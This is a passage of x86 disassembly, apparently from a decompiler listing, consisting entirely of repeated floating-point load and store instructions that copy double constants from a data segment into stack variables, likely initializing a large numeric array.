		fstp	[ebp+var_1798]
		fld	ds:dbl_4244E8
		fstp	[ebp+var_1790]
		fld	ds:dbl_424680
		fstp	[ebp+var_1788]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_1780]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_1778]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_1770]
		fld	ds:dbl_424760
		fstp	[ebp+var_1768]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_1760]
		fld	ds:dbl_424B98
		fstp	[ebp+var_1758]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_1750]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_1748]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_1740]
		fld	ds:dbl_424A38
		fstp	[ebp+var_1738]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_1730]
		fld	ds:dbl_424A00
		fstp	[ebp+var_1728]
		fld	ds:dbl_424B68
		fstp	[ebp+var_1720]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_1718]
		fld	ds:dbl_424790
		fstp	[ebp+var_1710]
		fld	ds:dbl_424A58
		fstp	[ebp+var_1708]
		fld	ds:dbl_424800
		fstp	[ebp+var_1700]
		fld	ds:dbl_4247C0
		fstp	[ebp+var_16F8]
		fld	ds:dbl_424A48
		fstp	[ebp+var_16F0]
		fld	ds:dbl_424670
		fstp	[ebp+var_16E8]
		fld	ds:dbl_424930
		fstp	[ebp+var_16E0]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_16D8]
		fld	ds:dbl_424B80
		fstp	[ebp+var_16D0]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_16C8]
		fld	ds:dbl_4246D0
		fstp	[ebp+var_16C0]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_16B8]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_16B0]
		fld	ds:dbl_424808
		fstp	[ebp+var_16A8]
		fld	ds:dbl_424678
		fstp	[ebp+var_16A0]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_1698]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_1690]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_1688]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_1680]
		fld	ds:dbl_424888
		fstp	[ebp+var_1678]
		fld	ds:dbl_424858
		fstp	[ebp+var_1670]
		fld	ds:dbl_424B60
		fstp	[ebp+var_1668]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_1660]
		fld	ds:dbl_4244C8
		fstp	[ebp+var_1658]
		fld	ds:dbl_4244C0
		fstp	[ebp+var_1650]
		fld	ds:dbl_424B28
		fstp	[ebp+var_1648]
		fld	ds:dbl_424638
		fstp	[ebp+var_1640]
		fld	ds:dbl_424578
		fstp	[ebp+var_1638]
		fld	ds:dbl_424BB8
		fstp	[ebp+var_1630]
		fld	ds:dbl_424770
		fstp	[ebp+var_1628]
		fld	ds:dbl_424948
		fstp	[ebp+var_1620]
		fld	ds:dbl_424A38
		fstp	[ebp+var_1618]
		fld	ds:dbl_4244B8
		fstp	[ebp+var_1610]
		fld	ds:dbl_424A60
		fstp	[ebp+var_1608]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_1600]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_15F8]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_15F0]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_15E8]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_15E0]
		fld	ds:dbl_424908
		fstp	[ebp+var_15D8]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_15D0]
		fld	ds:dbl_424708
		fstp	[ebp+var_15C8]
		fld	ds:dbl_424700
		fstp	[ebp+var_15C0]
		fld	ds:dbl_424618
		fstp	[ebp+var_15B8]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_15B0]
		fldz
		fstp	[ebp+var_15A8]
		fld	ds:dbl_4245F0
		fstp	[ebp+var_15A0]
		fld	ds:dbl_424860
		fstp	[ebp+var_1598]
		fld	ds:dbl_424568
		fstp	[ebp+var_1590]
		fld	ds:dbl_424B10
		fstp	[ebp+var_1588]
		fld	ds:dbl_4246D8
		fstp	[ebp+var_1580]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_1578]
		fld	ds:dbl_424500
		fstp	[ebp+var_1570]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_1568]
		fld	ds:dbl_424710
		fstp	[ebp+var_1560]
		fld	ds:dbl_424B68
		fstp	[ebp+var_1558]
		fld	ds:dbl_4244A8
		fstp	[ebp+var_1550]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_1548]
		fld	ds:dbl_424B40
		fstp	[ebp+var_1540]
		fld	ds:dbl_424618
		fstp	[ebp+var_1538]
		fldz
		fstp	[ebp+var_1530]
		fld	ds:dbl_424980
		fstp	[ebp+var_1528]
		fld	ds:dbl_424608
		fstp	[ebp+var_1520]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_1518]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_1510]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_1508]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_1500]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_14F8]
		fld	ds:dbl_424738
		fstp	[ebp+var_14F0]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_14E8]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_14E0]
		fld	ds:dbl_424498
		fstp	[ebp+var_14D8]
		fld	ds:dbl_424570
		fstp	[ebp+var_14D0]
		fld	ds:dbl_424880
		fstp	[ebp+var_14C8]
		fld	ds:dbl_4244B8
		fstp	[ebp+var_14C0]
		fld	ds:dbl_424B78
		fstp	[ebp+var_14B8]
		fld	ds:dbl_424B18
		fstp	[ebp+var_14B0]
		fld	ds:dbl_424750
		fstp	[ebp+var_14A8]
		fld	ds:dbl_424B00
		fstp	[ebp+var_14A0]
		fld	ds:dbl_424AB8
		fstp	[ebp+var_1498]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_1490]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_1488]
		fld	ds:dbl_424548
		fstp	[ebp+var_1480]
		fld	ds:dbl_424850
		fstp	[ebp+var_1478]
		fld	ds:dbl_424770
		fstp	[ebp+var_1470]
		fld	ds:dbl_424868
		fstp	[ebp+var_1468]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_1460]
		fld	ds:dbl_4247E8
		fstp	[ebp+var_1458]
		fld	ds:dbl_424A20
		fstp	[ebp+var_1450]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_1448]
		fld	ds:dbl_424630
		fstp	[ebp+var_1440]
		fld	ds:dbl_424558
		fstp	[ebp+var_1438]
		fld	ds:dbl_424950
		fstp	[ebp+var_1430]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_1428]
		fld	ds:dbl_424A68
		fstp	[ebp+var_1420]
		fld	ds:dbl_424878
		fstp	[ebp+var_1418]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_1410]
		fld	ds:dbl_424540
		fstp	[ebp+var_1408]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_1400]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_13F8]
		fld	ds:dbl_424970
		fstp	[ebp+var_13F0]
		fld	ds:dbl_424688
		fstp	[ebp+var_13E8]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_13E0]
		fld	ds:dbl_424AB8
		fstp	[ebp+var_13D8]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_13D0]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_13C8]
		fld	ds:dbl_424780
		fstp	[ebp+var_13C0]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_13B8]
		fld	ds:dbl_424A30
		fstp	[ebp+var_13B0]
		fld	ds:dbl_4248F8
		fstp	[ebp+var_13A8]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_13A0]
		fld	ds:dbl_424A40
		fstp	[ebp+var_1398]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_1390]
		fld	ds:dbl_424AC0
		fstp	[ebp+var_1388]
		fld	ds:dbl_424B70
		fstp	[ebp+var_1380]
		fld	ds:dbl_4245C8
		fstp	[ebp+var_1378]
		fld	ds:dbl_4244C0
		fstp	[ebp+var_1370]
		fld	ds:dbl_424748
		fstp	[ebp+var_1368]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_1360]
		fldz
		fstp	[ebp+var_1358]
		fld	ds:dbl_4244B8
		fstp	[ebp+var_1350]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_1348]
		fld	ds:dbl_424790
		fstp	[ebp+var_1340]
		fld	ds:dbl_424550
		fstp	[ebp+var_1338]
		fld	ds:dbl_424490
		fstp	[ebp+var_1330]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_1328]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_1320]
		fld	ds:dbl_424560
		fstp	[ebp+var_1318]
		fld	ds:dbl_424618
		fstp	[ebp+var_1310]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_1308]
		fld	ds:dbl_424488
		fstp	[ebp+var_1300]
		fld	ds:dbl_424518
		fstp	[ebp+var_12F8]
		fld	ds:dbl_424968
		fstp	[ebp+var_12F0]
		fld	ds:dbl_424820
		fstp	[ebp+var_12E8]
		fld	ds:dbl_424880
		fstp	[ebp+var_12E0]
		fld	ds:dbl_424808
		fstp	[ebp+var_12D8]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_12D0]
		fld	ds:dbl_424978
		fstp	[ebp+var_12C8]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_12C0]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_12B8]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_12B0]
		fld	ds:dbl_424780
		fstp	[ebp+var_12A8]
		fld	ds:dbl_424A90
		fstp	[ebp+var_12A0]
		fld	ds:dbl_424558
		fstp	[ebp+var_1298]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_1290]
		fld	ds:dbl_424598
		fstp	[ebp+var_1288]
		fld	ds:dbl_424480
		fstp	[ebp+var_1280]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_1278]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_1270]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_1268]
		fld	ds:dbl_424848
		fstp	[ebp+var_1260]
		fld	ds:dbl_424B50
		fstp	[ebp+var_1258]
		fld	ds:dbl_424A08
		fstp	[ebp+var_1250]
		fld	ds:dbl_424620
		fstp	[ebp+var_1248]
		fld	ds:dbl_424C08
		fstp	[ebp+var_1240]
		fld	ds:dbl_424A40
		fstp	[ebp+var_1238]
		fld	ds:dbl_424520
		fstp	[ebp+var_1230]
		fld	ds:dbl_424670
		fstp	[ebp+var_1228]
		fld	ds:dbl_424808
		fstp	[ebp+var_1220]
		fld	ds:dbl_424618
		fstp	[ebp+var_1218]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_1210]
		fld	ds:dbl_424598
		fstp	[ebp+var_1208]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_1200]
		fld	ds:dbl_4244C8
		fstp	[ebp+var_11F8]
		fld	ds:dbl_424810
		fstp	[ebp+var_11F0]
		fld	ds:dbl_424478
		fstp	[ebp+var_11E8]
		fld	ds:dbl_424538
		fstp	[ebp+var_11E0]
		fld	ds:dbl_424880
		fstp	[ebp+var_11D8]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_11D0]
		fld	ds:dbl_424998
		fstp	[ebp+var_11C8]
		fld	ds:dbl_424670
		fstp	[ebp+var_11C0]
		fld	ds:dbl_424790
		fstp	[ebp+var_11B8]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_11B0]
		fld	ds:dbl_424A48
		fstp	[ebp+var_11A8]
		fld	ds:dbl_424648
		fstp	[ebp+var_11A0]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_1198]
		fld	ds:dbl_424B98
		fstp	[ebp+var_1190]
		fld	ds:dbl_424B20
		fstp	[ebp+var_1188]
		fld	ds:dbl_424498
		fstp	[ebp+var_1180]
		fld	ds:dbl_424A28
		fstp	[ebp+var_1178]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_1170]
		fld	ds:dbl_424558
		fstp	[ebp+var_1168]
		fld	ds:dbl_424878
		fstp	[ebp+var_1160]
		fld	ds:dbl_4248F8
		fstp	[ebp+var_1158]
		fld	ds:dbl_424500
		fstp	[ebp+var_1150]
		fld	ds:dbl_424B18
		fstp	[ebp+var_1148]
		fld	ds:dbl_424668
		fstp	[ebp+var_1140]
		fld	ds:dbl_424538
		fstp	[ebp+var_1138]
		fld	ds:dbl_424838
		fstp	[ebp+var_1130]
		fld	ds:dbl_424590
		fstp	[ebp+var_1128]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_1120]
		fld	ds:dbl_424998
		fstp	[ebp+var_1118]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_1110]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_1108]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_1100]
		fld	ds:dbl_424708
		fstp	[ebp+var_10F8]
		fld	ds:dbl_424560
		fstp	[ebp+var_10F0]
		fld	ds:dbl_424A78
		fstp	[ebp+var_10E8]
		fld	ds:dbl_424538
		fstp	[ebp+var_10E0]
		fld	ds:dbl_424608
		fstp	[ebp+var_10D8]
		fld	ds:dbl_424B38
		fstp	[ebp+var_10D0]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_10C8]
		fld	ds:dbl_424B30
		fstp	[ebp+var_10C0]
		fld	ds:dbl_424B10
		fstp	[ebp+var_10B8]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_10B0]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_10A8]
		fld	ds:dbl_424998
		fstp	[ebp+var_10A0]
		fld	ds:dbl_4244F0
		fstp	[ebp+var_1098]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_1090]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_1088]
		fld	ds:dbl_424828
		fstp	[ebp+var_1080]
		fld	ds:dbl_424520
		fstp	[ebp+var_1078]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_1070]
		fld	ds:dbl_424B20
		fstp	[ebp+var_1068]
		fld	ds:dbl_424880
		fstp	[ebp+var_1060]
		fld	ds:dbl_424718
		fstp	[ebp+var_1058]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_1050]
		fld	ds:dbl_424940
		fstp	[ebp+var_1048]
		fld	ds:dbl_424620
		fstp	[ebp+var_1040]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_1038]
		fld	ds:dbl_424C00
		fstp	[ebp+var_1030]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_1028]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_1020]
		fld	ds:dbl_424888
		fstp	[ebp+var_1018]
		fld	ds:dbl_424928
		fstp	[ebp+var_1010]
		fld	ds:dbl_424670
		fstp	[ebp+var_1008]
		fld	ds:dbl_424B18
		fstp	[ebp+var_1000]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_FF8]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_FF0]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_FE8]
		fld	ds:dbl_424A18
		fstp	[ebp+var_FE0]
		fld	ds:dbl_424798
		fstp	[ebp+var_FD8]
		fld	ds:dbl_424550
		fstp	[ebp+var_FD0]
		fld	ds:dbl_424470
		fstp	[ebp+var_FC8]
		fld	ds:dbl_424B90
		fstp	[ebp+var_FC0]
		fld	ds:dbl_424B00
		fstp	[ebp+var_FB8]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_FB0]
		fld	ds:dbl_424968
		fstp	[ebp+var_FA8]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_FA0]
		fld	ds:dbl_424880
		fstp	[ebp+var_F98]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_F90]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_F88]
		fld	ds:dbl_424B20
		fstp	[ebp+var_F80]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_F78]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_F70]
		fld	ds:dbl_424898
		fstp	[ebp+var_F68]
		fld	ds:dbl_424798
		fstp	[ebp+var_F60]
		fld	ds:dbl_424648
		fstp	[ebp+var_F58]
		fld	ds:dbl_424A78
		fstp	[ebp+var_F50]
		fld	ds:dbl_4247C0
		fstp	[ebp+var_F48]
		fld	ds:dbl_424898
		fstp	[ebp+var_F40]
		fld	ds:dbl_424610
		fstp	[ebp+var_F38]
		fld	ds:dbl_424778
		fstp	[ebp+var_F30]
		fld	ds:dbl_424708
		fstp	[ebp+var_F28]
		fld	ds:dbl_424860
		fstp	[ebp+var_F20]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_F18]
		fld	ds:dbl_424718
		fstp	[ebp+var_F10]
		fld	ds:dbl_424948
		fstp	[ebp+var_F08]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_F00]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_EF8]
		fld	ds:dbl_4244F8
		fstp	[ebp+var_EF0]
		fld	ds:dbl_424B60
		fstp	[ebp+var_EE8]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_EE0]
		fld	ds:dbl_424A58
		fstp	[ebp+var_ED8]
		fld	ds:dbl_424730
		fstp	[ebp+var_ED0]
		fld	ds:dbl_424880
		fstp	[ebp+var_EC8]
		fld	ds:dbl_424658
		fstp	[ebp+var_EC0]
		fld	ds:dbl_424528
		fstp	[ebp+var_EB8]
		fld	ds:dbl_424A20
		fstp	[ebp+var_EB0]
		fld	ds:dbl_424468
		fstp	[ebp+var_EA8]
		fld	ds:dbl_424540
		fstp	[ebp+var_EA0]
		fld	ds:dbl_4247C0
		fstp	[ebp+var_E98]
		fld	ds:dbl_424870
		fstp	[ebp+var_E90]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_E88]
		fld	ds:dbl_424460
		fstp	[ebp+var_E80]
		fld	ds:dbl_424580
		fstp	[ebp+var_E78]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_E70]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_E68]
		fld	ds:dbl_424928
		fstp	[ebp+var_E60]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_E58]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_E50]
		fld	ds:dbl_424968
		fstp	[ebp+var_E48]
		fld	ds:dbl_424A88
		fstp	[ebp+var_E40]
		fld	ds:dbl_424688
		fstp	[ebp+var_E38]
		fld	ds:dbl_424680
		fstp	[ebp+var_E30]
		fld	ds:dbl_424840
		fstp	[ebp+var_E28]
		fld	ds:dbl_424908
		fstp	[ebp+var_E20]
		fld	ds:dbl_424B50
		fstp	[ebp+var_E18]
		fld	ds:dbl_424A80
		fstp	[ebp+var_E10]
		fld	ds:dbl_424748
		fstp	[ebp+var_E08]
		fld	ds:dbl_424950
		fstp	[ebp+var_E00]
		fld	ds:dbl_424860
		fstp	[ebp+var_DF8]
		fld	ds:dbl_4245F0
		fstp	[ebp+var_DF0]
		fld	ds:dbl_424760
		fstp	[ebp+var_DE8]
		fld	ds:dbl_424570
		fstp	[ebp+var_DE0]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_DD8]
		fld	ds:dbl_424B08
		fstp	[ebp+var_DD0]
		fld	ds:dbl_424500
		fstp	[ebp+var_DC8]
		fld	ds:dbl_424470
		fstp	[ebp+var_DC0]
		fld	ds:dbl_4244A8
		fstp	[ebp+var_DB8]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_DB0]
		fld	ds:dbl_424458
		fstp	[ebp+var_DA8]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_DA0]
		fld	ds:dbl_4247A8
		fstp	[ebp+var_D98]
		fld	ds:dbl_424708
		fstp	[ebp+var_D90]
		fld	ds:dbl_424458
		fstp	[ebp+var_D88]
		fld	ds:dbl_4244F0
		fstp	[ebp+var_D80]
		fld	ds:dbl_424528
		fstp	[ebp+var_D78]
		fld	ds:dbl_424A18
		fstp	[ebp+var_D70]
		fld	ds:dbl_424558
		fstp	[ebp+var_D68]
		fld	ds:dbl_424A10
		fstp	[ebp+var_D60]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_D58]
		fld	ds:dbl_424478
		fstp	[ebp+var_D50]
		fld	ds:dbl_424830
		fstp	[ebp+var_D48]
		fld	ds:dbl_424A90
		fstp	[ebp+var_D40]
		fld	ds:dbl_424520
		fstp	[ebp+var_D38]
		fld	ds:dbl_424B90
		fstp	[ebp+var_D30]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_D28]
		fld	ds:dbl_424540
		fstp	[ebp+var_D20]
		fld	ds:dbl_424578
		fstp	[ebp+var_D18]
		fld	ds:dbl_424450
		fstp	[ebp+var_D10]
		fld	ds:dbl_424518
		fstp	[ebp+var_D08]
		fld	ds:dbl_424B20
		fstp	[ebp+var_D00]
		fld	ds:dbl_424910
		fstp	[ebp+var_CF8]
		fld	ds:dbl_424908
		fstp	[ebp+var_CF0]
		fld	ds:dbl_424548
		fstp	[ebp+var_CE8]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_CE0]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_CD8]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_CD0]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_CC8]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_CC0]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_CB8]
		fld	ds:dbl_424B40
		fstp	[ebp+var_CB0]
		fld	ds:dbl_424B88
		fstp	[ebp+var_CA8]
		fld	ds:dbl_424470
		fstp	[ebp+var_CA0]
		fld	ds:dbl_424A88
		fstp	[ebp+var_C98]
		fld	ds:dbl_424718
		fstp	[ebp+var_C90]
		fld	ds:dbl_424910
		fstp	[ebp+var_C88]
		fld	ds:dbl_424A40
		fstp	[ebp+var_C80]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_C78]
		fld	ds:dbl_424740
		fstp	[ebp+var_C70]
		fld	ds:dbl_4248F8
		fstp	[ebp+var_C68]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_C60]
		fld	ds:dbl_424610
		fstp	[ebp+var_C58]
		fld	ds:dbl_424800
		fstp	[ebp+var_C50]
		fld	ds:dbl_424B40
		fstp	[ebp+var_C48]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_C40]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_C38]
		fld	ds:dbl_4246D8
		fstp	[ebp+var_C30]
		fld	ds:dbl_424690
		fstp	[ebp+var_C28]
		fld	ds:dbl_4246B8
		fstp	[ebp+var_C20]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_C18]
		fld	ds:dbl_424638
		fstp	[ebp+var_C10]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_C08]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_C00]
		fld	ds:dbl_424458
		fstp	[ebp+var_BF8]
		fld	ds:dbl_424930
		fstp	[ebp+var_BF0]
		fld	ds:dbl_424668
		fstp	[ebp+var_BE8]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_BE0]
		fld	ds:dbl_4248F8
		fstp	[ebp+var_BD8]
		fld	ds:dbl_424A10
		fstp	[ebp+var_BD0]
		fld	ds:dbl_424680
		fstp	[ebp+var_BC8]
		fld	ds:dbl_424BC8
		fstp	[ebp+var_BC0]
		fld	ds:dbl_424BC8
		fstp	[ebp+var_BB8]
		fld	ds:dbl_424508
		fstp	[ebp+var_BB0]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_BA8]
		fld	ds:dbl_424590
		fstp	[ebp+var_BA0]
		fld	ds:dbl_424518
		fstp	[ebp+var_B98]
		fld	ds:dbl_424540
		fstp	[ebp+var_B90]
		fld	ds:dbl_424890
		fstp	[ebp+var_B88]
		fld	ds:dbl_424988
		fstp	[ebp+var_B80]
		fld	ds:dbl_424590
		fstp	[ebp+var_B78]
		fld	ds:dbl_424700
		fstp	[ebp+var_B70]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_B68]
		fld	ds:dbl_424998
		fstp	[ebp+var_B60]
		fld	ds:dbl_424930
		fstp	[ebp+var_B58]
		fld	ds:dbl_424728
		fstp	[ebp+var_B50]
		fld	ds:dbl_424B58
		fstp	[ebp+var_B48]
		fld	ds:dbl_424460
		fstp	[ebp+var_B40]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_B38]
		fld	ds:dbl_424518
		fstp	[ebp+var_B30]
		fld	ds:dbl_424B30
		fstp	[ebp+var_B28]
		fld	ds:dbl_4249F8
		fstp	[ebp+var_B20]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_B18]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_B10]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_B08]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_B00]
		fld	ds:dbl_424850
		fstp	[ebp+var_AF8]
		fld	ds:dbl_424918
		fstp	[ebp+var_AF0]
		fldz
		fstp	[ebp+var_AE8]
		fld	ds:dbl_424468
		fstp	[ebp+var_AE0]
		fld	ds:dbl_424B38
		fstp	[ebp+var_AD8]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_AD0]
		fld	ds:dbl_4244C0
		fstp	[ebp+var_AC8]
		fld	ds:dbl_424760
		fstp	[ebp+var_AC0]
		fld	ds:dbl_424668
		fstp	[ebp+var_AB8]
		fld	ds:dbl_424758
		fstp	[ebp+var_AB0]
		fld	ds:dbl_424A20
		fstp	[ebp+var_AA8]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_AA0]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_A98]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_A90]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_A88]
		fld	ds:dbl_424938
		fstp	[ebp+var_A80]
		fld	ds:dbl_424760
		fstp	[ebp+var_A78]
		fld	ds:dbl_424750
		fstp	[ebp+var_A70]
		fld	ds:dbl_424698
		fstp	[ebp+var_A68]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_A60]
		fld	ds:dbl_424470
		fstp	[ebp+var_A58]
		fld	ds:dbl_424630
		fstp	[ebp+var_A50]
		fld	ds:dbl_424860
		fstp	[ebp+var_A48]
		fld	ds:dbl_424878
		fstp	[ebp+var_A40]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_A38]
		fld	ds:dbl_424A88
		fstp	[ebp+var_A30]
		fld	ds:dbl_424568
		fstp	[ebp+var_A28]
		fld	ds:dbl_424A50
		fstp	[ebp+var_A20]
		fld	ds:dbl_4247A8
		fstp	[ebp+var_A18]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_A10]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_A08]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_A00]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_9F8]
		fld	ds:dbl_424C08
		fstp	[ebp+var_9F0]
		fld	ds:dbl_424858
		fstp	[ebp+var_9E8]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_9E0]
		fld	ds:dbl_424518
		fstp	[ebp+var_9D8]
		fld	ds:dbl_424790
		fstp	[ebp+var_9D0]
		fld	ds:dbl_424480
		fstp	[ebp+var_9C8]
		fld	ds:dbl_424988
		fstp	[ebp+var_9C0]
		fld	ds:dbl_424A30
		fstp	[ebp+var_9B8]
		fld	ds:dbl_424998
		fstp	[ebp+var_9B0]
		fld	ds:dbl_424B80
		fstp	[ebp+var_9A8]
		fld	ds:dbl_424828
		fstp	[ebp+var_9A0]
		fld	ds:dbl_424678
		fstp	[ebp+var_998]
		fld	ds:dbl_424A80
		fstp	[ebp+var_990]
		fld	ds:dbl_424708
		fstp	[ebp+var_988]
		fld	ds:dbl_424448
		fstp	[ebp+var_980]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_978]
		fld	ds:dbl_424818
		fstp	[ebp+var_970]
		fld	ds:dbl_424728
		fstp	[ebp+var_968]
		fld	ds:dbl_424780
		fstp	[ebp+var_960]
		fld	ds:dbl_424B70
		fstp	[ebp+var_958]
		fld	ds:dbl_424A80
		fstp	[ebp+var_950]
		fld	ds:dbl_4244A8
		fstp	[ebp+var_948]
		fld	ds:dbl_424800
		fstp	[ebp+var_940]
		fld	ds:dbl_424518
		fstp	[ebp+var_938]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_930]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_928]
		fld	ds:dbl_4245F0
		fstp	[ebp+var_920]
		fld	ds:dbl_424A30
		fstp	[ebp+var_918]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_910]
		fld	ds:dbl_424748
		fstp	[ebp+var_908]
		fld	ds:dbl_424498
		fstp	[ebp+var_900]
		fld	ds:dbl_424898
		fstp	[ebp+var_8F8]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_8F0]
		fld	ds:dbl_424930
		fstp	[ebp+var_8E8]
		fld	ds:dbl_424478
		fstp	[ebp+var_8E0]
		fld	ds:dbl_424B28
		fstp	[ebp+var_8D8]
		fld	ds:dbl_424950
		fstp	[ebp+var_8D0]
		fld	ds:dbl_424900
		fstp	[ebp+var_8C8]
		fld	ds:dbl_424650
		fstp	[ebp+var_8C0]
		fld	ds:dbl_424A28
		fstp	[ebp+var_8B8]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_8B0]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_8A8]
		fld	ds:dbl_424948
		fstp	[ebp+var_8A0]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_898]
